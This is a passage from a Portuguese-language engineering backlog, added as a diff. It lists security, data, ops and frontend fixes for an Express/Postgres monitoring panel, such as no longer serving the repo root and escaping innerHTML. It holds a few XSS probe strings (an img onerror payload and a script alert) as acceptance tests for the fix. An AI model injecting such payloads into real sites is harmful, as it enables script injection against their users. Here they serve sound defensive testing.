+- **Depende de:** P0-3 (testes cobrindo o comportamento atual antes de
+  refatorar).
+
+## P2-3 — `public/` dedicado (parar de servir raiz do repo)
+
+- **Categoria:** Segurança / Frontend
+- **Status:** pending
+- **Fonte:** Auditoria de backend + frontend + segurança 2026-07-08
+- **Evidência:** `server.js:74` — `app.use(express.static(path.join(__dirname)))`
+  serve raiz inteira: `server.js`, `services/*`, `ecosystem.config.js`,
+  `logs/`, `CHECKPOINT.md`. `.env` protegido só pelo default `dotfiles:'ignore'`.
+- **Impacto:** Qualquer pessoa na rede lê código-fonte, logs operacionais
+  e detalhes de infra sem autenticação.
+- **Ação:**
+  1. Criar `public/` na raiz.
+  2. Mover `index.html`, `vendor/`, `logo.*` pra `public/`.
+  3. `server.js:74` → `app.use(express.static(path.join(__dirname, 'public')))`.
+  4. `server.js:77` → `sendFile(path.join(__dirname, 'public', 'index.html'))`.
+- **Aceite:**
+  - [ ] `curl http://localhost:3002/server.js` retorna 404.
+  - [ ] `curl http://localhost:3002/logs/out.log` retorna 404.
+  - [ ] Painel continua funcionando normalmente.
+- **Esforço:** 1-2h.
+- **Rollback:** Reverter commit (mover arquivos de volta).
+- **Depende de:** nada, mas coordena bem com P3-2 (split do frontend).
+
+## P2-4 — Escapar dados EDP em `innerHTML`
+
+- **Categoria:** Segurança / Frontend
+- **Status:** pending
+- **Fonte:** Auditoria de segurança + frontend 2026-07-08
+- **Evidência:** 133 usos de `innerHTML` em `index.html`. `escapeHtml`
+  usado só 13 vezes e definido **em duplicidade** (`index.html:5862` e `:7327`).
+  Dados da API WPA (endereço, nome de OS, comentário) entram crus. JWT em
+  `localStorage` (`index.html:5406`) — XSS = roubo de sessão.
+- **Impacto:** Dado da EDP contendo `<img src=x onerror=...>` executa JS.
+  Baixa probabilidade (dados operacionais raramente têm markup), mas
+  vetor real.
+- **Ação:**
+  1. Deletar uma das definições duplicadas de `escapeHtml`, deixar uma
+     global no topo do `<script>`.
+  2. Aplicar em pontos identificados como críticos:
+     - `index.html:10618-10619` (nome/cargo de colaborador)
+     - `index.html:10857-10871` (cliente.nome, endereco.logradouro, texto
+       da OS)
+     - `onclick` construídos com interpolação: usar `data-*` attributes +
+       listener delegado (mata os `${...}` em atributo).
+  3. Adicionar CSP restritivo em `server.js`:
+     `Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline';`
+     (unsafe-inline ainda necessário porque tem onclick inline; remover
+     depois do P3-2).
+- **Aceite:**
+  - [ ] `escapeHtml` definido 1 vez, usado em pontos críticos.
+  - [ ] Payload de teste com `<script>alert(1)</script>` no nome de OS
+    renderiza como texto.
+  - [ ] Header CSP presente em resposta.
+- **Esforço:** meio dia.
+- **Rollback:** Reverter commit.
+- **Depende de:** nada.
+
+## P2-5 — Tie-breaker `.order('id')` em queries paginadas
+
+- **Categoria:** Dados
+- **Status:** pending
+- **Fonte:** Auditoria de dados 2026-07-08
+- **Evidência:** `db/queries.js:236`, `:622`, `:954` — paginam sobre
+  `captured_at` DESC apenas. `dataWriter.js:45` insere ~60 equipes num
+  único INSERT (mesmo `captured_at`). Postgres não garante ordem estável
+  em empates.
+- **Impacto:** Fronteira de página cai dentro de grupo empatado → linhas
+  duplicam/somem entre páginas. Bug não-reproduzível que mina confiança
+  em exports.
+- **Ação:** Adicionar `.order('id')` como tie-breaker nas 3 queries
+  (`pgShim.js` já suporta múltiplos `.order()`).
+- **Aceite:** 3 queries com tie-breaker; testes de paginação verdes.
+- **Esforço:** 30min.
+- **Rollback:** Reverter (ordem instável volta).
+- **Depende de:** nada.
+
+## P2-6 — `statement_timeout` no pool Postgres
+
+- **Categoria:** Dados
+- **Status:** pending
+- **Fonte:** Auditoria de dados 2026-07-08
+- **Evidência:** `services/pgShim.js:42-48` — pool configurado sem timeout.
+  Query pesada em JSONB pode segurar as 10 conexões.
+- **Impacto:** Range grande na aba Deslocamentos ou export mensal pode
+  ocupar conexões por minutos. Enquanto isso, cron de escrita enfileira
+  → painel trava em cascata.
+- **Ação:** Adicionar `options: '-c statement_timeout=60000'` no `new Pool()`
+  em `pgShim.js`.
+- **Aceite:** Query travada > 60s aborta com erro (validar com
+  `SELECT pg_sleep(70)` via psql).
+- **Esforço:** 5min.
+- **Rollback:** Trivial.
+- **Depende de:** nada.
+
+## P2-7 — Schema drift: `pg_dump --schema-only` no git
+
+- **Categoria:** Ops / Dados
+- **Status:** pending
+- **Fonte:** Auditoria de dados 2026-07-08
+- **Evidência:**
+  - `team_daily_carteira` é escrita (`dataWriter.js:682-685`) e lida
+    (`routes/index.js:2671-2679`) mas **não tem CREATE TABLE em nenhum
+    `.sql` do repo**.
+  - `migrations/add_note_rejections.sql:23-25` define colunas
+    `reason_codes/reason_labels/rejected_at` enquanto
+    `supabase/migrations/008_note_rejections.sql:31-35` define
+    `motivo_codes/motivo_textos/rejection_date` (o código usa este).
+- **Impacto:** DR ou ambiente novo quebra silenciosamente. Schema real
+  vive só na VM. Sem staging, isso é único ponto de falha.
+- **Ação:**
+  1. Na VM: `pg_dump -d wpa_monitor --schema-only > /tmp/schema.sql`
+  2. Commitar como `db/schema-atual.sql` no repo (referência, não
+     rodável direto — documenta o real).
+  3. Deletar `migrations/add_note_rejections.sql` obsoleto.
+  4. Escrever migration incremental `db/migrations/YYYYMMDD-team_daily_carteira.sql`
+     com o CREATE TABLE correto (já existe em algum comentário do repo).
+- **Aceite:**
+  - [ ] `db/schema-atual.sql` no git.
+  - [ ] Comparação (`diff schema-atual.sql supabase/schema.sql`) revela
+    todas as diferenças.
+  - [ ] Migração de `team_daily_carteira` versionada.
+- **Esforço:** 2h.
+- **Rollback:** Reverter commit.
+- **Depende de:** P0-1 (senha `wpa_app` acessível — ou fazer com o próprio
+  José antes do handoff).
+
+## P2-8 — Extrair CSS pra `css/app.css` (primeiro passo do split)
+
+- **Categoria:** Frontend
+- **Status:** pending
+- **Fonte:** Auditoria de frontend 2026-07-08
+- **Evidência:** `index.html` linhas 20-4279 são `<style>` — 4.259 linhas
+  de CSS num único arquivo com HTML e JS. Encolhe o monolito em 33% sem
+  risco de quebrar JS.
+- **Impacto:** Valida o padrão de servir assets separados (pré-requisito
+  pro split do JS em P3-2). Melhora tempo de load e cache.
+- **Ação:**
+  1. Copiar linhas 20-4279 pra `public/css/app.css`.
+  2. `<link rel="stylesheet" href="css/app.css?v=YYYYMMDD">` no `<head>`
+     do index.html.
+  3. Remover o `<style>` interno.
+  4. Testar visualmente todas as abas.
+- **Aceite:**
+  - [ ] `index.html` encolheu ~4200 linhas.
+  - [ ] Zero regressão visual em Monitor, Rejeições, Gráficos, Ranking,
+    Mapa, Deslocamentos, Notas, Histórico, Metas.
+- **Esforço:** 2-3h.
+- **Rollback:** Reverter commit.
+- **Depende de:** P2-3 (`public/` criado).
+
+## P2-9 — Watchdog externo (UptimeRobot/BetterStack)
+
+- **Categoria:** Operação
+- **Status:** pending
+- **Fonte:** CTO review 2026-07-08
+- **Evidência:** P1-1 é watchdog interno (no crontab da mesma VM). Se a
+  VM cair, o watchdog cai junto — não alerta. Precisa de monitoria
+  externa.
+- **Impacto:** VM inteira offline não gera alerta. Contrato com SLA (P2-N
+  a definir com EDP) fica sem prova de uptime.
+- **Ação:**
+  1. Criar conta gratuita UptimeRobot (free tier 50 monitores, 5min interval)
+     ou BetterStack.
+  2. Adicionar monitor apontando pro `/health` (público? ou expor um
+     `/health-public` sem auth com JSON mínimo).
+  3. Configurar alerta pra email/Teams do José + backup humano.
+  4. Salvar credenciais no cofre P0-1.
+- **Aceite:**
+  - [ ] Monitor externo ativo.
+  - [ ] Teste: PM2 parado 10min → alerta chega.
+- **Esforço:** 1h.
+- **Rollback:** Deletar monitor.
+- **Depende de:** P1-2 (`/health` real).
+
+## P2-10 — Persistir estado do `_reclassifyJob`
+
+- **Categoria:** Backend
+- **Status:** pending
+- **Fonte:** Auditoria de backend 2026-07-08
+- **Evidência:** `routes/index.js:1733` — `_reclassifyJob` é variável de
+  módulo em memória. `_runReclassifyBackground` roda ~80 linhas de pipeline
+  async. OOM ou deploy no meio → cliente que faz poll em
+  `/admin/subcat-reclassify/status` vê `job:null` pra sempre.
+- **Impacto:** Job longo (reclassificação de subcategorias) sem persistência
+  de progresso. Se cair, perde-se contexto.
+- **Ação:**
+  1. Persistir estado em `app_settings` com key `reclassify_job` a cada
+     lote: `{running:true, done:N, total:M, startedAt, lastBatchAt}`.
+  2. No boot do server, ler `reclassify_job` e marcar como `interrupted`
+     se `running=true` (ninguém retomou; requer intervenção manual).
+  3. Endpoint `/admin/subcat-reclassify/status` lê do banco em vez da
+     variável.
+- **Aceite:** Status persiste após restart do PM2.
+- **Esforço:** 3-4h.
+- **Rollback:** Reverter.
+- **Depende de:** nada.
+
+---
+
+# P3 — Baixa prioridade (higiene, faça se sobrar tempo)
+
+## P3-1 — Dividir `routes/index.js` por domínio
+
+- **Categoria:** Backend
+- **Status:** pending
+- **Fonte:** Auditoria de backend 2026-07-08
+- **Evidência:** `routes/index.js` = 2.755 linhas, ~60 rotas, 12 domínios.
+- **Impacto:** Manutenibilidade. Não é urgente, mas cada mudança fica mais
+  arriscada.
+- **Ação:** Extrair um domínio por PR (começar por `debug` + `admin`,
+  ~1.200 linhas juntos). Preservar `routes/index.js` como orquestrador
+  (mount + middlewares).
+- **Aceite:** `routes/index.js` < 500 linhas ao fim.
+- **Esforço:** 1-2 semanas incremental.
+- **Rollback:** Cada PR é rollback-able.
+- **Depende de:** P2-1 (testes de contrato pra garantir zero regressão).
+
+## P3-2 — Split incremental do `index.html`
+
+- **Categoria:** Frontend
+- **Status:** pending
+- **Fonte:** Auditoria de frontend 2026-07-08
+- **Evidência:** 12.832 linhas, 286 funções globais, 56 lets soltos.
+- **Impacto:** Manutenibilidade. Onboarding de novo dev demora semanas.
+- **Ação:** JS em arquivos ordenados `public/js/00-auth.js`, `01-constants.js`,
+  `02-state.js`, `10-multiselect.js`, `20-monitor.js`, ..., `90-boot.js`
+  via `<script src>` clássicos. Sem bundler.
+- **Aceite:** `index.html` só HTML + `<link>` + `<script>` refs.
+- **Esforço:** 3-4 semanas incremental.
+- **Rollback:** Cada aba é PR separado, rollback-able.
+- **Depende de:** P2-8 (CSS já extraído).
+
+## P3-3 — Error handler central do Express
+
+- **Categoria:** Backend
+- **Status:** pending
+- **Fonte:** Auditoria de backend 2026-07-08
+- **Evidência:** 65 ocorrências de `res.status(500).json({error: err.message})`
+  em `routes/index.js`.
+- **Ação:** `app.use((err, req, res, next))` em `server.js` com request-id
+  + resposta genérica. Helper `asyncHandler(fn)` migrado gradualmente.
+- **Aceite:** Nenhum novo handler precisa de try/catch inline.
+- **Esforço:** meio dia + migração gradual.
+- **Depende de:** P3-1 (fica natural no split de rotas).
+
+## P3-4 — Serialização temporal do cron
+
+- **Categoria:** Backend
+- **Status:** pending
+- **Fonte:** Auditoria de pipeline 2026-07-08
+- **Evidência:** `upsertSubcatTotals` intraday pode rodar depois do wipe do
+  `consolidateDay` e re-inserir linhas parciais.
+- **Ação:** Flag `_consolidating: Set(dates)` bloqueia upsert intraday em
+  datas em consolidação.
+- **Esforço:** meio dia.
+- **Depende de:** P0-3 (consolidação transacional).
+
+## P3-5 — Cap de range em endpoints de histórico
+
+- **Categoria:** Dados
+- **Status:** pending
+- **Evidência:** `db/queries.js:950, 230, 616` carregam JSONB completo dos
+  snapshots. Export de 60+ dias pode causar OOM.
+- **Ação:** Rejeitar range > 62 dias com 400 nas rotas de export/histórico.
+- **Esforço:** 1h.
+
+## P3-6 — Índice de expressão em `note_details`
+
+- **Categoria:** Dados
+- **Status:** pending
+- **Evidência:** `db/deslocamentosQueries.js:150-163` filtra por
+  `(payload->'checkpoints'->0->>'timestamp')::timestamptz` sem índice.
+- **Ação:** `CREATE INDEX idx_nd_first_cp ON note_details ((payload->'checkpoints'->0->>'timestamp'))`.
+- **Esforço:** 30min.
+
+## P3-7 — `pg_advisory_xact_lock` no `pushTeams`
+
+- **Categoria:** Dados
+- **Status:** pending
+- **Evidência:** `dataWriter.js:16-19,64-70` — lock in-process. Se um dia
+  escalar PM2 pra 2 instâncias, quebra.
+- **Ação:** Substituir por advisory lock via Postgres (cross-process).
+- **Esforço:** 2h.
+
+## P3-8 — Remover código morto Vercel/Supabase-remote
+
+- **Categoria:** Backend
+- **Status:** pending
+- **Evidência:** `server.js:101-102` branch `VERCEL`; `vercel.json` na raiz;
+  `routes/cron.js:1-15` doc de Vercel Cron; `dbClient.js:34-41` modo
+  supabase; `@supabase/supabase-js` no `package.json`.
+- **Ação:** Remover. Historia fica no git.
+- **Esforço:** meio dia.
+
+## P3-9 — Constantes duplicadas em módulo único
+
+- **Categoria:** Backend
+- **Status:** pending
+- **Evidência:** `['DESG','DEPT','DESC','DSSJ']` em 4 lugares;
+  `ENGELMIG_COMPANY_ID` em 3.
+- **Ação:** Exportar `SETORES` e `ENGELMIG_COMPANY_ID` de `services/regionals.js`
+  (extensão do módulo pequeno já existente).
+- **Esforço:** 1h.
+
+## P3-10 — Acessibilidade básica
+
+- **Categoria:** Frontend
+- **Status:** pending
+- **Evidência:** Grep confirma 0 `aria-*`, 0 `role`, 0 `tabindex`. 22
+  divs/spans com `onclick`.
+- **Ação:** Trocar interativos por `<button>` estilizado. Adicionar
+  `role="tablist"/tab` nas abas. Faça oportunisticamente ao mexer em cada
+  aba pelo split (P3-2).
+- **Esforço:** distribuído ao longo do split.
+
+---
+
+# Log de execução
+
+Ao concluir um item, mova pra cá com data + hash do commit:
+
+- (nada ainda — este backlog acabou de ser criado)
+
+---
+
+# Como adicionar novo item ao backlog
+
+1. Descubra a categoria (Governança/Segurança/Dados/Ops/Backend/Frontend/Qualidade).
+2. Avalie severidade contra o contrato EDP (P0 se ameaça contrato, P1 se
+   ameaça continuidade operacional, P2 se ameaça velocidade de resposta,
+   P3 se é higiene).
+3. Colete evidência `file:line` — se não tiver, ache antes.
+4. Escreva no formato dos itens acima. **Não pule campos.**
+5. Insira na posição correta por severidade (não anexe no fim se for P0).
+6. Renumere se necessário (`P1-N` → mantenha únicos).
+7. Commit com mensagem `docs(backlog): adiciona item P1-N — <título curto>`.
